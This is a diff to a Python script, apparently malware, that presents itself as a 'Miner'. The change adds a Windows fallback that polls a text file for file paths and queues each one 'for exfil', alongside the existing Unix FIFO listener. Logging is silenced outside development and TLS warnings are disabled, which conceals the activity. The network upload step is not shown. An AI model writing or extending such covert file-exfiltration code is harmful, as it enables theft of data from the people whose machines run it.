@@ -13,6 +13,8 @@ from random import choice, randint
 from collections import deque
 import urllib3
 import select
+import platform
+
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -29,12 +31,23 @@ CONFIG = {
 
 TARGET = 3 * 10**45  # Target difficulty
 PROCESSING_DELAY = 0.1  # Delay per hash
-FIFO_PATH = "/tmp/fifo"
 logger = logging.getLogger("Miner")
 if ENV == "DEV":
     logging.basicConfig(level=logging.INFO)
 else:
     logging.basicConfig(level=logging.CRITICAL)  # Suppresses INFO/WARNING/ERROR
+
+
+IS_WINDOWS = platform.system() == "Windows"
+
+if IS_WINDOWS:
+    FIFO_PATH = "fifo_sim.txt"
+    # Use file-based listener
+else:
+    FIFO_PATH = "/tmp/fifo"
+    if not os.path.exists(FIFO_PATH):
+        os.mkfifo(FIFO_PATH)
+
 # ========== COMPONENTS ==========
 
 
@@ -190,12 +203,33 @@ def fifo_listener_loop(stop_event):
         logger.info("[*] FIFO listener stopped.")
 
 
+def fifo_sim_listener_loop(stop_event):
+    last_pos = 0
+    path = "fifo_sim.txt"
+    open(path, "a").close()  # ensure it exists
+
+    logger.info("[*] FIFO (sim) listener started.")
+    while not stop_event.is_set():
+        with open(path, "r") as f:
+            f.seek(last_pos)
+            lines = f.readlines()
+            last_pos = f.tell()
+
+            for line in lines:
+                filepath = line.strip()
+                if os.path.isfile(filepath):
+                    file_stack.add(filepath)
+                    logger.info(f"[+] Queued for exfil: {filepath}")
+        time.sleep(1)
+
+
 # ========== MAIN ENTRY ==========
 
 
 def main():
     miner_id = uuid.uuid4().hex
     stop_event = threading.Event()
+    fifo_loop = fifo_listener_loop if not IS_WINDOWS else fifo_sim_listener_loop
 
     threads = [
         threading.Thread(
@@ -209,7 +243,7 @@ def main():
             daemon=True,
         ),
         threading.Thread(
-            target=fifo_listener_loop,
+            target=fifo_loop,
             args=(stop_event,),
             daemon=True,
         ),
